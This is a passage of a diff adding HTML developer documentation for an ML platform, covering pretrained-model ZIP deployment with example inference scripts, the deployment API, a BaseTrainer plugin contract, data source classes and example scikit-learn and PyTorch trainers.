+    <span class="st">"name"</span>:       <span class="st">"my-detector"</span>,
+    <span class="st">"model_file"</span>: <span class="st">"model.pt"</span>,
+    <span class="st">"entry_point"</span>: <span class="st">"inference.py"</span>,
+    <span class="st">"input_schema"</span>: {
+        <span class="st">"fields"</span>: {
+            <span class="st">"image_b64"</span>: { <span class="st">"type"</span>: <span class="st">"string"</span>, <span class="st">"required"</span>: <span class="kw">true</span> },
+            <span class="st">"threshold"</span>: { <span class="st">"type"</span>: <span class="st">"number"</span>, <span class="st">"default"</span>: <span class="nu">0.5</span> }
+        }
+    }
+}</code></pre>
+      </div>
+    </details>
+
+    <h3>inference.py</h3>
+    <pre><code><span class="kw">import</span> base64, io
+<span class="kw">import</span> mlflow.pyfunc
+<span class="kw">import</span> numpy <span class="kw">as</span> np
+
+
+<span class="kw">class</span> <span class="cl">MyDetector</span>(mlflow.pyfunc.<span class="cl">PythonModel</span>):
+
+    <span class="kw">def</span> <span class="fn">load_context</span>(<span class="dt">self</span>, context):
+        <span class="kw">from</span> ultralytics <span class="kw">import</span> YOLO
+        <span class="dt">self</span>.model = <span class="cl">YOLO</span>(context.artifacts[<span class="st">"model_file"</span>])
+
+    <span class="kw">def</span> <span class="fn">predict</span>(<span class="dt">self</span>, context, model_input):
+        <span class="kw">import</span> cv2
+        row   = <span class="dt">self</span>._to_dict(model_input)
+        conf  = <span class="fn">float</span>(row.get(<span class="st">"threshold"</span>, <span class="nu">0.5</span>))
+        data  = base64.b64decode(row[<span class="st">"image_b64"</span>])
+        arr   = np.<span class="fn">frombuffer</span>(data, np.uint8)
+        img   = cv2.<span class="fn">imdecode</span>(arr, cv2.IMREAD_COLOR)
+
+        results = <span class="dt">self</span>.model.predict(img, conf=conf, verbose=<span class="kw">False</span>)[<span class="nu">0</span>]
+        detections = []
+        <span class="kw">for</span> x1, y1, x2, y2, score, cls <span class="kw">in</span> results.boxes.data.tolist():
+            detections.append({
+                <span class="st">"bbox"</span>:  [<span class="fn">int</span>(x1), <span class="fn">int</span>(y1), <span class="fn">int</span>(x2), <span class="fn">int</span>(y2)],
+                <span class="st">"class"</span>: <span class="fn">int</span>(cls),
+                <span class="st">"score"</span>: <span class="fn">round</span>(<span class="fn">float</span>(score), <span class="nu">4</span>),
+            })
+        <span class="kw">return</span> {<span class="st">"detections"</span>: detections, <span class="st">"count"</span>: <span class="fn">len</span>(detections)}
+
+    <span class="kw">def</span> <span class="fn">_to_dict</span>(<span class="dt">self</span>, m):
+        <span class="kw">return</span> m.iloc[<span class="nu">0</span>].to_dict() <span class="kw">if</span> hasattr(m, <span class="st">"to_dict"</span>) <span class="kw">else</span> <span class="fn">dict</span>(m)</code></pre>
+  </section>
+
+  <!-- Example: sklearn -->
+  <section id="example-sklearn">
+    <h2>Example: scikit-learn Model with Scaler</h2>
+    <p>A tabular classification model with a preprocessing scaler stored as an artifact.</p>
+
+    <details>
+      <summary>📁 ZIP file contents — click to expand</summary>
+      <div class="details-body">
+        <div class="tree" style="margin-top:12px">
+<span class="dir">tabular-classifier/</span><br>
+<span class="req">  ├── manifest.json</span>      ← model_file: "model.pkl"<br>
+<span class="req">  ├── inference.py</span><br>
+<span class="req">  ├── model.pkl</span>           ← trained sklearn model<br>
+<span class="opt">  └── artifacts/</span><br>
+<span class="opt">      └── scaler.pkl</span>     ← StandardScaler<br>
+        </div>
+        <p style="font-size:12px;margin-top:8px;color:var(--muted)">Build: <code class="inline">zip -r tabular_classifier.zip tabular-classifier/</code></p>
+
+        <h4 style="margin-top:16px">manifest.json</h4>
+        <pre><code>{
+    <span class="st">"name"</span>:        <span class="st">"tabular-classifier"</span>,
+    <span class="st">"version"</span>:     <span class="st">"1.0.0"</span>,
+    <span class="st">"model_file"</span>:  <span class="st">"model.pkl"</span>,
+    <span class="st">"entry_point"</span>: <span class="st">"inference.py"</span>,
+    <span class="st">"input_schema"</span>: {
+        <span class="st">"fields"</span>: {
+            <span class="st">"f1"</span>: { <span class="st">"type"</span>: <span class="st">"number"</span>, <span class="st">"required"</span>: <span class="kw">true</span> },
+            <span class="st">"f2"</span>: { <span class="st">"type"</span>: <span class="st">"number"</span>, <span class="st">"required"</span>: <span class="kw">true</span> },
+            <span class="st">"f3"</span>: { <span class="st">"type"</span>: <span class="st">"number"</span>, <span class="st">"required"</span>: <span class="kw">true</span> }
+        }
+    }
+}</code></pre>
+      </div>
+    </details>
+
+    <pre><code><span class="kw">import</span> mlflow.pyfunc
+
+
+<span class="kw">class</span> <span class="cl">TabularClassifier</span>(mlflow.pyfunc.<span class="cl">PythonModel</span>):
+
+    <span class="kw">def</span> <span class="fn">load_context</span>(<span class="dt">self</span>, context):
+        <span class="kw">import</span> joblib
+        <span class="dt">self</span>.model  = joblib.load(context.artifacts[<span class="st">"model_file"</span>])
+        <span class="dt">self</span>.scaler = joblib.load(context.artifacts[<span class="st">"scaler"</span>])
+
+    <span class="kw">def</span> <span class="fn">predict</span>(<span class="dt">self</span>, context, model_input):
+        <span class="kw">import</span> numpy <span class="kw">as</span> np
+        row        = <span class="dt">self</span>._to_dict(model_input)
+        features   = np.array([[row[<span class="st">"f1"</span>], row[<span class="st">"f2"</span>], row[<span class="st">"f3"</span>]]])
+        scaled     = <span class="dt">self</span>.scaler.transform(features)
+        pred       = <span class="dt">self</span>.model.predict(scaled)[<span class="nu">0</span>]
+        proba      = <span class="dt">self</span>.model.predict_proba(scaled)[<span class="nu">0</span>].tolist()
+        <span class="kw">return</span> {<span class="st">"class"</span>: <span class="fn">int</span>(pred), <span class="st">"probabilities"</span>: proba}
+
+    <span class="kw">def</span> <span class="fn">_to_dict</span>(<span class="dt">self</span>, m):
+        <span class="kw">return</span> m.iloc[<span class="nu">0</span>].to_dict() <span class="kw">if</span> hasattr(m, <span class="st">"to_dict"</span>) <span class="kw">else</span> <span class="fn">dict</span>(m)</code></pre>
+
+    <h3>Test inference</h3>
+    <pre><code>curl -X POST http://localhost:8030/api/v1/inference/tabular-classifier \
+  -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"inputs": {"f1": 1.2, "f2": 3.4, "f3": 5.6}}'</span></code></pre>
+  </section>
+
+  <!-- Deploy API -->
+  <section id="deploy-api">
+    <h2>Pre-trained Deployment API</h2>
+
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/models/deploy-pretrained/zip</code><span>Recommended — full ZIP</span></div>
+    <pre><code><span class="cm"># Multipart form upload</span>
+curl -X POST http://localhost:8030/api/v1/models/deploy-pretrained/zip \
+  -F <span class="st">"file=@my_model.zip"</span>
+
+<span class="cm"># Response</span>
+{ <span class="st">"job_id"</span>: <span class="st">"6..."</span>, <span class="st">"model_name"</span>: <span class="st">"my-model"</span>, <span class="st">"status"</span>: <span class="st">"queued"</span> }</code></pre>
+
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/models/deploy-pretrained/upload</code><span>File + optional inference script</span></div>
+    <pre><code>curl -X POST http://localhost:8030/api/v1/models/deploy-pretrained/upload \
+  -F <span class="st">"file=@model.pkl"</span> \
+  -F <span class="st">"name=my-model"</span> \
+  -F <span class="st">"inference_script=@inference.py"</span></code></pre>
+
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/models/deploy-pretrained</code><span>URI sources (HuggingFace / S3 / URL)</span></div>
+    <pre><code><span class="cm"># HuggingFace</span>
+curl -X POST http://localhost:8030/api/v1/models/deploy-pretrained \
+  -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"name": "sentiment", "huggingface_model_id": "distilbert-base-uncased", "huggingface_task": "text-classification"}'</span>
+
+<span class="cm"># Poll job</span>
+curl http://localhost:8030/api/v1/training/jobs/{job_id}</code></pre>
+
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/inference/{name}/schema</code><span>See what inputs a model expects</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/models</code><span>List active deployments</span></div>
+    <div class="endpoint"><span class="method delete">DELETE</span><code>/api/v1/models/{id}</code><span>Delete a deployment</span></div>
+  </section>
+
+  <hr>
+
+  <!-- ═══════════════════════════════════════════ -->
+  <!--            SELF-TRAINING PLUGINS             -->
+  <!-- ═══════════════════════════════════════════ -->
+
+  <section id="trainer-overview">
+    <h2>Self-Training Plugins</h2>
+    <p>A self-training plugin is a single Python file containing a class that inherits from <code class="inline">BaseTrainer</code>. The platform discovers the class, runs your training loop, logs the model to MLflow, and makes it available for inference — all automatically.</p>
+
+    <div class="callout info">
+      <strong>File Upload</strong>
+      Upload your .py file via <code class="inline">POST /api/v1/trainers/upload</code>. The file is saved to the shared plugin volume and the trainer is registered immediately.
+    </div>
+  </section>
+
+  <!-- BaseTrainer -->
+  <section id="base-trainer">
+    <h2>BaseTrainer Contract</h2>
+    <pre><code><span class="kw">from</span> app.abstract.base_trainer <span class="kw">import</span> BaseTrainer, TrainingConfig, EvaluationResult
+<span class="kw">from</span> app.abstract.data_source <span class="kw">import</span> S3DataSource  <span class="cm"># choose any data source</span>
+
+
+<span class="kw">class</span> <span class="cl">MyTrainer</span>(<span class="cl">BaseTrainer</span>):
+
+    <span class="cm"># ── Required class attributes ──────────────────────────────────────────────</span>
+    name        = <span class="st">"my-model"</span>           <span class="cm"># unique slug — becomes inference URL</span>
+    data_source = <span class="cl">S3DataSource</span>(        <span class="cm"># where to load training data from</span>
+        bucket=<span class="st">"pms-ml"</span>,
+        key=<span class="st">"datasets/my_dataset.csv"</span>,
+    )
+
+    <span class="cm"># ── Optional class attributes ──────────────────────────────────────────────</span>
+    version     = <span class="st">"1.0.0"</span>
+    description = <span class="st">"My model description"</span>
+    framework   = <span class="st">"sklearn"</span>             <span class="cm"># sklearn | pytorch | tensorflow | custom</span>
+    schedule    = <span class="st">"0 2 * * *"</span>           <span class="cm"># cron — auto-retrain at 2am daily</span>
+    tags        = {<span class="st">"domain"</span>: <span class="st">"billing"</span>}
+
+    <span class="cm"># ── Required methods ───────────────────────────────────────────────────────</span>
+
+    <span class="kw">def</span> <span class="fn">train</span>(<span class="dt">self</span>, preprocessed_data, config: <span class="cl">TrainingConfig</span>):
+        <span class="cm">"""
+        Train your model. Return either:
+          • the model object  (evaluation uses the default strategy)
+          • (model, test_data) tuple  (platform calls self.evaluate(model, test_data))
+        """</span>
+        <span class="kw">from</span> sklearn.ensemble <span class="kw">import</span> RandomForestClassifier
+        model = <span class="cl">RandomForestClassifier</span>(n_estimators=<span class="nu">100</span>)
+        X, y  = preprocessed_data
+        model.fit(X, y)
+        <span class="kw">return</span> model
+
+    <span class="kw">def</span> <span class="fn">predict</span>(<span class="dt">self</span>, model, inputs):
+        <span class="cm">"""
+        Run inference at serve time. Called by the platform when
+        POST /inference/{name} is received.
+        """</span>
+        <span class="kw">import</span> numpy <span class="kw">as</span> np
+        arr  = np.array([inputs[<span class="st">"features"</span>]])
+        pred = model.predict(arr)[<span class="nu">0</span>]
+        <span class="kw">return</span> {<span class="st">"prediction"</span>: <span class="fn">int</span>(pred)}
+
+    <span class="cm"># ── Optional methods ───────────────────────────────────────────────────────</span>
+
+    <span class="kw">def</span> <span class="fn">preprocess</span>(<span class="dt">self</span>, raw_data) -> tuple:
+        <span class="cm">"""Transform raw data before train(). Default: identity."""</span>
+        <span class="kw">import</span> pandas <span class="kw">as</span> pd, numpy <span class="kw">as</span> np
+        df = pd.<span class="fn">read_csv</span>(<span class="dt">self</span>.<span class="fn">_bytes_to_buf</span>(raw_data))
+        X  = df.drop(<span class="st">"label"</span>, axis=<span class="nu">1</span>).values
+        y  = df[<span class="st">"label"</span>].values
+        <span class="kw">return</span> X, y
+
+    <span class="kw">def</span> <span class="fn">postprocess</span>(<span class="dt">self</span>, predictions):
+        <span class="cm">"""Transform raw predictions before returning to caller. Default: identity."""</span>
+        <span class="kw">return</span> predictions
+
+    <span class="kw">def</span> <span class="fn">evaluate</span>(<span class="dt">self</span>, model, test_data) -> <span class="cl">EvaluationResult</span>:
+        <span class="cm">"""Custom evaluation. Default: auto accuracy for sklearn classifiers."""</span>
+        X_test, y_test = test_data
+        y_pred = model.predict(X_test)
+        acc    = (y_pred == y_test).<span class="fn">mean</span>()
+        <span class="kw">return</span> <span class="cl">EvaluationResult</span>(accuracy=acc, y_true=y_test.tolist(), y_pred=y_pred.tolist())
+
+    <span class="kw">def</span> <span class="fn">_bytes_to_buf</span>(<span class="dt">self</span>, data):
+        <span class="kw">import</span> io
+        <span class="kw">return</span> io.<span class="cl">BytesIO</span>(data) <span class="kw">if</span> isinstance(data, bytes) <span class="kw">else</span> io.<span class="cl">StringIO</span>(data)</code></pre>
+
+    <h3>TrainingConfig fields (summary)</h3>
+    <p>See the full reference at <a href="#training-config" style="color:var(--accent2)">Full TrainingConfig Reference</a>.</p>
+    <table>
+      <thead><tr><th>Field</th><th>Type</th><th>Default</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">cuda_device</code></td><td>str</td><td>"auto"</td><td>"auto" | "cpu" | "cuda" | "cuda:0" | "mps"</td></tr>
+        <tr><td><code class="inline">workers</code></td><td>int</td><td>4</td><td>DataLoader parallel workers</td></tr>
+        <tr><td><code class="inline">batch_size</code></td><td>int</td><td>32</td><td>Samples per mini-batch</td></tr>
+        <tr><td><code class="inline">mixed_precision</code></td><td>str</td><td>"auto"</td><td>"auto" | "no" | "fp16" | "bf16"</td></tr>
+        <tr><td><code class="inline">max_epochs</code></td><td>int</td><td>100</td><td>Training epoch cap</td></tr>
+        <tr><td><code class="inline">early_stopping</code></td><td>bool</td><td>true</td><td>Stop when val loss stops improving</td></tr>
+        <tr><td><code class="inline">early_stopping_patience</code></td><td>int</td><td>5</td><td>Epochs to wait before stopping</td></tr>
+        <tr><td><code class="inline">test_split</code></td><td>float</td><td>0.2</td><td>Fraction held out for evaluation</td></tr>
+        <tr><td><code class="inline">val_split</code></td><td>float</td><td>0.1</td><td>Fraction held out for validation/early stopping</td></tr>
+        <tr><td><code class="inline">random_seed</code></td><td>int</td><td>42</td><td>Reproducibility seed</td></tr>
+        <tr><td><code class="inline">optimizer</code></td><td>str</td><td>"adam"</td><td>"adam" | "adamw" | "sgd" | "rmsprop"</td></tr>
+        <tr><td><code class="inline">learning_rate</code></td><td>float</td><td>1e-3</td><td>Initial LR passed to the optimizer</td></tr>
+        <tr><td><code class="inline">weight_decay</code></td><td>float</td><td>0.0</td><td>L2 regularisation strength</td></tr>
+        <tr><td><code class="inline">gradient_clip</code></td><td>float|None</td><td>None</td><td>Max gradient norm (null = disabled)</td></tr>
+        <tr><td><code class="inline">lr_scheduler</code></td><td>str|None</td><td>None</td><td>"cosine" | "linear" | "step" | "plateau" | null</td></tr>
+        <tr><td><code class="inline">warmup_ratio</code></td><td>float</td><td>0.0</td><td>Fraction of total steps used for LR warm-up</td></tr>
+        <tr><td><code class="inline">task</code></td><td>str|None</td><td>None</td><td>"classification" | "regression" | "text-classification" | "image-classification" | "object-detection" | "segmentation" | "nlp-generation" | "time-series" | "anomaly-detection"</td></tr>
+        <tr><td><code class="inline">num_classes</code></td><td>int|None</td><td>None</td><td>Number of output classes (classification tasks)</td></tr>
+        <tr><td><code class="inline">extra</code></td><td>dict</td><td>{}</td><td>Arbitrary extra config forwarded to your trainer</td></tr>
+      </tbody>
+    </table>
+
+    <h3>EvaluationResult fields</h3>
+    <table>
+      <thead><tr><th>Field</th><th>Type</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">accuracy</code></td><td>float | None</td><td>Classification accuracy</td></tr>
+        <tr><td><code class="inline">precision / recall / f1</code></td><td>float | None</td><td>Classification metrics</td></tr>
+        <tr><td><code class="inline">roc_auc</code></td><td>float | None</td><td>Area under ROC curve</td></tr>
+        <tr><td><code class="inline">mse / mae / r2</code></td><td>float | None</td><td>Regression metrics</td></tr>
+        <tr><td><code class="inline">y_true / y_pred</code></td><td>list | None</td><td>Raw labels for confusion matrix</td></tr>
+        <tr><td><code class="inline">extra_metrics</code></td><td>dict</td><td>Any additional metrics you want logged</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- Data Sources -->
+  <section id="data-sources">
+    <h2>Data Sources (15+)</h2>
+    <p>Import from <code class="inline">app.abstract.data_source</code>. Each is a dataclass — just instantiate with the required parameters.</p>
+
+    <table>
+      <thead><tr><th>Class</th><th>Use case</th><th>Key params</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">S3DataSource</code></td><td>S3 / MinIO file or prefix</td><td><code class="inline">bucket, key</code></td></tr>
+        <tr><td><code class="inline">URLDataSource</code></td><td>HTTP/HTTPS download</td><td><code class="inline">url, headers</code></td></tr>
+        <tr><td><code class="inline">UploadedFileDataSource</code></td><td>Bytes injected via API</td><td>Auto-injected</td></tr>
+        <tr><td><code class="inline">LocalFileDataSource</code></td><td>Mounted volume path</td><td><code class="inline">path</code></td></tr>
+        <tr><td><code class="inline">InMemoryDataSource</code></td><td>Tests / notebooks</td><td><code class="inline">data</code></td></tr>
+        <tr><td><code class="inline">MongoDBDataSource</code></td><td>MongoDB query</td><td><code class="inline">uri, database, collection, filter</code></td></tr>
+        <tr><td><code class="inline">PostgreSQLDataSource</code></td><td>PostgreSQL query</td><td><code class="inline">dsn, query</code></td></tr>
+        <tr><td><code class="inline">SQLDataSource</code></td><td>Any SQL via SQLAlchemy</td><td><code class="inline">connection_string, query</code></td></tr>
+        <tr><td><code class="inline">HuggingFaceDataSource</code></td><td>HF Hub dataset</td><td><code class="inline">dataset_name, split, config</code></td></tr>
+        <tr><td><code class="inline">KafkaDataSource</code></td><td>Kafka topic</td><td><code class="inline">bootstrap_servers, topic, max_messages</code></td></tr>
+        <tr><td><code class="inline">GCSDataSource</code></td><td>Google Cloud Storage</td><td><code class="inline">bucket, blob, credentials_json</code></td></tr>
+        <tr><td><code class="inline">AzureBlobDataSource</code></td><td>Azure Blob Storage</td><td><code class="inline">connection_string, container, blob</code></td></tr>
+        <tr><td><code class="inline">FTPDataSource</code></td><td>FTP / SFTP remote file</td><td><code class="inline">host, port, username, password, remote_path</code></td></tr>
+        <tr><td><code class="inline">PaginatedAPIDataSource</code></td><td>Paginated REST API</td><td><code class="inline">base_url, params, page_param, data_key</code></td></tr>
+        <tr><td><code class="inline">RedisDataSource</code></td><td>Redis list / set / pattern</td><td><code class="inline">url, key, data_type</code></td></tr>
+      </tbody>
+    </table>
+
+    <h3>Usage examples</h3>
+    <pre><code><span class="kw">from</span> app.abstract.data_source <span class="kw">import</span> (
+    S3DataSource, MongoDBDataSource, HuggingFaceDataSource,
+    PaginatedAPIDataSource, RedisDataSource,
+)
+
+<span class="cm"># Load a CSV from MinIO</span>
+data_source = <span class="cl">S3DataSource</span>(bucket=<span class="st">"pms-ml"</span>, key=<span class="st">"datasets/rent.csv"</span>)
+
+<span class="cm"># Query MongoDB</span>
+data_source = <span class="cl">MongoDBDataSource</span>(
+    uri=<span class="st">"mongodb://mongodb:27017"</span>,
+    database=<span class="st">"pms"</span>,
+    collection=<span class="st">"invoices"</span>,
+    filter={<span class="st">"status"</span>: <span class="st">"paid"</span>},
+    limit=<span class="nu">10000</span>,
+)
+
+<span class="cm"># Load from HuggingFace Hub</span>
+data_source = <span class="cl">HuggingFaceDataSource</span>(
+    dataset_name=<span class="st">"imdb"</span>,
+    split=<span class="st">"train"</span>,
+)
+
+<span class="cm"># Paginated REST API</span>
+data_source = <span class="cl">PaginatedAPIDataSource</span>(
+    base_url=<span class="st">"https://api.example.com/data"</span>,
+    params={<span class="st">"limit"</span>: <span class="nu">100</span>},
+    page_param=<span class="st">"page"</span>,
+    data_key=<span class="st">"results"</span>,
+    max_pages=<span class="nu">50</span>,
+)</code></pre>
+  </section>
+
+  <!-- Training Lifecycle -->
+  <section id="trainer-lifecycle">
+    <h2>Training Lifecycle</h2>
+    <p>When <code class="inline">POST /training/start</code> is called, the platform executes this sequence:</p>
+    <div class="steps">
+      <div class="step">
+        <div class="step-body">
+          <h4>Load data</h4>
+          <p><code class="inline">data_source.load()</code> is called. Returns raw bytes, string, list, or any format your data source returns.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-body">
+          <h4>Preprocess</h4>
+          <p><code class="inline">trainer.preprocess(raw_data)</code> transforms raw data into whatever <code class="inline">train()</code> expects (numpy arrays, DataFrames, PyTorch datasets, etc.). Override this — defaults to identity.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-body">
+          <h4>Train</h4>
+          <p><code class="inline">trainer.train(preprocessed_data, config)</code> returns the trained model (or a <code class="inline">(model, test_data)</code> tuple if you want custom evaluation).</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-body">
+          <h4>Evaluate</h4>
+          <p><code class="inline">trainer.evaluate(model, test_data)</code> returns an <code class="inline">EvaluationResult</code>. Metrics are logged to MLflow automatically.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-body">
+          <h4>Log to MLflow</h4>
+          <p>The model is saved to MLflow with the appropriate flavour (<code class="inline">mlflow.sklearn</code>, <code class="inline">mlflow.pytorch</code>, etc.) and registered under <code class="inline">trainer.name</code>.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-body">
+          <h4>Create deployment record</h4>
+          <p>A <code class="inline">ModelDeployment</code> is written to MongoDB with <code class="inline">status: "active"</code>, making the model immediately available for inference.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Example: Classifier -->
+  <section id="example-classifier">
+    <h2>Example: Full Rent Prediction Trainer</h2>
+    <pre><code><span class="kw">import</span> io
+<span class="kw">from</span> app.abstract.base_trainer <span class="kw">import</span> BaseTrainer, TrainingConfig, EvaluationResult
+<span class="kw">from</span> app.abstract.data_source <span class="kw">import</span> S3DataSource
+
+
+<span class="kw">class</span> <span class="cl">RentPredictionTrainer</span>(<span class="cl">BaseTrainer</span>):
+    name        = <span class="st">"rent-predictor"</span>
+    version     = <span class="st">"1.0.0"</span>
+    description = <span class="st">"Predicts monthly rent from property features"</span>
+    framework   = <span class="st">"sklearn"</span>
+    schedule    = <span class="st">"0 3 * * 1"</span>   <span class="cm"># retrain every Monday at 3am</span>
+    tags        = {<span class="st">"domain"</span>: <span class="st">"finance"</span>, <span class="st">"type"</span>: <span class="st">"regression"</span>}
+
+    data_source = <span class="cl">S3DataSource</span>(
+        bucket=<span class="st">"pms-ml"</span>,
+        key=<span class="st">"datasets/properties.csv"</span>,
+    )
+
+    <span class="kw">def</span> <span class="fn">preprocess</span>(<span class="dt">self</span>, raw_data):
+        <span class="kw">import</span> pandas <span class="kw">as</span> pd, numpy <span class="kw">as</span> np
+        <span class="kw">from</span> sklearn.model_selection <span class="kw">import</span> train_test_split
+        <span class="kw">from</span> sklearn.preprocessing <span class="kw">import</span> StandardScaler
+
+        df = pd.<span class="fn">read_csv</span>(io.<span class="cl">BytesIO</span>(raw_data))
+        features = [<span class="st">"bedrooms"</span>, <span class="st">"bathrooms"</span>, <span class="st">"sq_ft"</span>, <span class="st">"floor"</span>]
+        X = df[features].values
+        y = df[<span class="st">"monthly_rent"</span>].values
+
+        <span class="dt">self</span>.scaler = <span class="cl">StandardScaler</span>()
+        X_scaled = <span class="dt">self</span>.scaler.fit_transform(X)
+
+        <span class="kw">return</span> train_test_split(X_scaled, y, test_size=<span class="nu">0.2</span>, random_state=<span class="nu">42</span>)
+
+    <span class="kw">def</span> <span class="fn">train</span>(<span class="dt">self</span>, preprocessed_data, config: <span class="cl">TrainingConfig</span>):
+        <span class="kw">from</span> sklearn.ensemble <span class="kw">import</span> GradientBoostingRegressor
+        X_train, X_test, y_train, y_test = preprocessed_data
+        model = <span class="cl">GradientBoostingRegressor</span>(
+            n_estimators=<span class="nu">200</span>,
+            learning_rate=<span class="nu">0.05</span>,
+            max_depth=<span class="nu">5</span>,
+        )
+        model.fit(X_train, y_train)
+        <span class="kw">return</span> model, (X_test, y_test)
+
+    <span class="kw">def</span> <span class="fn">evaluate</span>(<span class="dt">self</span>, model, test_data) -> <span class="cl">EvaluationResult</span>:
+        <span class="kw">from</span> sklearn.metrics <span class="kw">import</span> mean_absolute_error, r2_score
+        X_test, y_test = test_data
+        y_pred = model.predict(X_test)
+        <span class="kw">return</span> <span class="cl">EvaluationResult</span>(
+            mae=<span class="fn">float</span>(mean_absolute_error(y_test, y_pred)),
+            r2=<span class="fn">float</span>(r2_score(y_test, y_pred)),
+            y_true=y_test.tolist(),
+            y_pred=y_pred.tolist(),
+            extra_metrics={<span class="st">"training_samples"</span>: <span class="fn">len</span>(X_test) * <span class="nu">4</span>}
+        )
+
+    <span class="kw">def</span> <span class="fn">predict</span>(<span class="dt">self</span>, model, inputs: dict):
+        <span class="kw">import</span> numpy <span class="kw">as</span> np
+        features = np.array([[
+            inputs[<span class="st">"bedrooms"</span>], inputs[<span class="st">"bathrooms"</span>],
+            inputs[<span class="st">"sq_ft"</span>],   inputs[<span class="st">"floor"</span>],
+        ]])
+        scaled = <span class="dt">self</span>.scaler.transform(features)
+        pred   = model.predict(scaled)[<span class="nu">0</span>]
+        <span class="kw">return</span> {<span class="st">"monthly_rent"</span>: <span class="fn">round</span>(<span class="fn">float</span>(pred), <span class="nu">2</span>)}
+
+    <span class="kw">def</span> <span class="fn">get_feature_names</span>(<span class="dt">self</span>):
+        <span class="kw">return</span> [<span class="st">"bedrooms"</span>, <span class="st">"bathrooms"</span>, <span class="st">"sq_ft"</span>, <span class="st">"floor"</span>]</code></pre>
+  </section>
+
+  <!-- Example: PyTorch -->
+  <section id="example-pytorch">
+    <h2>Example: PyTorch Neural Network</h2>
+    <pre><code><span class="kw">import</span> torch, torch.nn <span class="kw">as</span> nn
+<span class="kw">from</span> app.abstract.base_trainer <span class="kw">import</span> BaseTrainer, TrainingConfig
+<span class="kw">from</span> app.abstract.data_source <span class="kw">import</span> S3DataSource
+
+
+<span class="kw">class</span> <span class="cl">SimpleNet</span>(nn.<span class="cl">Module</span>):
+    <span class="kw">def</span> <span class="fn">__init__</span>(<span class="dt">self</span>, in_features, out_features):
+        <span class="fn">super</span>().<span class="fn">__init__</span>()
+        <span class="dt">self</span>.net = nn.<span class="cl">Sequential</span>(
+            nn.<span class="cl">Linear</span>(in_features, <span class="nu">128</span>), nn.<span class="cl">ReLU</span>(),
+            nn.<span class="cl">Linear</span>(<span class="nu">128</span>, <span class="nu">64</span>),          nn.<span class="cl">ReLU</span>(),
+            nn.<span class="cl">Linear</span>(<span class="nu">64</span>, out_features),
+        )
+    <span class="kw">def</span> <span class="fn">forward</span>(<span class="dt">self</span>, x):
+        <span class="kw">return</span> <span class="dt">self</span>.net(x)
+
+
+<span class="kw">class</span> <span class="cl">TenantChurnTrainer</span>(<span class="cl">BaseTrainer</span>):
+    name       = <span class="st">"tenant-churn"</span>
+    framework  = <span class="st">"pytorch"</span>
+    schedule   = <span class="st">"0 4 * * *"</span>
+    data_source = <span class="cl">S3DataSource</span>(bucket=<span class="st">"pms-ml"</span>, key=<span class="st">"datasets/churn.parquet"</span>)
+
+    <span class="kw">def</span> <span class="fn">preprocess</span>(<span class="dt">self</span>, raw_data):
+        <span class="kw">import</span> pandas <span class="kw">as</span> pd, io
+        <span class="kw">from</span> sklearn.model_selection <span class="kw">import</span> train_test_split
+        df = pd.<span class="fn">read_parquet</span>(io.<span class="cl">BytesIO</span>(raw_data))
+        X  = df.drop(<span class="st">"churned"</span>, axis=<span class="nu">1</span>).values.astype(<span class="st">"float32"</span>)
+        y  = df[<span class="st">"churned"</span>].values.astype(<span class="st">"float32"</span>)
+        <span class="kw">return</span> train_test_split(X, y, test_size=<span class="nu">0.2</span>)
+
+    <span class="kw">def</span> <span class="fn">train</span>(<span class="dt">self</span>, preprocessed_data, config: <span class="cl">TrainingConfig</span>):
+        X_train, X_test, y_train, y_test = preprocessed_data
+        device = torch.<span class="fn">device</span>(<span class="st">"cuda"</span> <span class="kw">if</span> torch.cuda.is_available() <span class="kw">else</span> <span class="st">"cpu"</span>)
+
+        model = <span class="cl">SimpleNet</span>(<span class="fn">in_features</span>=X_train.shape[<span class="nu">1</span>], <span class="fn">out_features</span>=<span class="nu">1</span>).to(device)
+        opt   = torch.optim.<span class="fn">Adam</span>(model.parameters(), lr=<span class="nu">1e-3</span>)
+        loss_fn = nn.<span class="cl">BCEWithLogitsLoss</span>()
+
+        X_t = torch.<span class="fn">tensor</span>(X_train).to(device)
+        y_t = torch.<span class="fn">tensor</span>(y_train).unsqueeze(<span class="nu">1</span>).to(device)
+
+        <span class="kw">for</span> epoch <span class="kw">in</span> <span class="fn">range</span>(config.max_epochs):
+            model.train()
+            opt.zero_grad()
+            loss = loss_fn(model(X_t), y_t)
+            loss.backward()
+            opt.step()
+
+        <span class="kw">return</span> model, (X_test, y_test)
+
+    <span class="kw">def</span> <span class="fn">predict</span>(<span class="dt">self</span>, model, inputs: dict):
+        <span class="kw">import</span> torch
+        x = torch.<span class="fn">tensor</span>([inputs[<span class="st">"features"</span>]], dtype=torch.float32)
+        <span class="kw">with</span> torch.no_grad():
+            prob = torch.sigmoid(model(x)).item()
+        <span class="kw">return</span> {<span class="st">"churn_probability"</span>: <span class="fn">round</span>(prob, <span class="nu">4</span>), <span class="st">"will_churn"</span>: prob > <span class="nu">0.5</span>}</code></pre>
+
+    <div class="callout warn">
+      <strong>Model persistence with PyTorch</strong>
+      Return the model from <code class="inline">train()</code>. The platform wraps it with <code class="inline">mlflow.pytorch.log_model()</code> automatically. You do not need to call <code class="inline">torch.save()</code> yourself.
+    </div>
+  </section>
+
+  <!-- Example: Regressor -->
+  <section id="example-regressor">
+    <h2>Example: Scheduled MongoDB Trainer</h2>
+    <p>Pull training data directly from the PMS MongoDB database and retrain nightly.</p>
+    <pre><code><span class="kw">from</span> app.abstract.base_trainer <span class="kw">import</span> BaseTrainer, TrainingConfig
